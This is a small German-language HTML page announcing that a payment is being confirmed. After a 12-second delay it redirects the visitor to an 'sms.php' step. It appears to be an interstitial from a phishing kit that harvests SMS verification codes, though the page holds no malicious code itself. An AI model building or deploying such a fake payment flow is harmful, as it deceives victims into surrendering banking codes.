
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">


<title>Bitte warten</title>
    <link href="resources/img/favicon.ico" rel="icon" type="image/x-icon" />

<style>
body {
  background-color: #f2f2f2;
  font-family: Arial, sans-serif;
}
.container {
  max-width: 900px;
  margin: 0 auto;
  padding: 250px;
  text-align: center;
  background-color: #fff;
  box-shadow: 0px 0px 10px rgba(0,0,0,0.2);
}
.loading {
  display: none;
  margin-top: 500px;
}
.loading img {
  width: 800px;
}
</style>
</head>
<body>
<div class="container">
  <h2>Bitte warten Sie, wir bestätigen Ihre Zahlung.</h2>
 
  <p>Wenn Sie nicht automatisch weitergeleitet werden, <a href="sms.php">klicken Sie hier</a>.</p>

<meta http-equiv="refresh" content="12;url=sms.php">


<img src="e.gif" width="250" alt="Loading logo">



</body>
</html>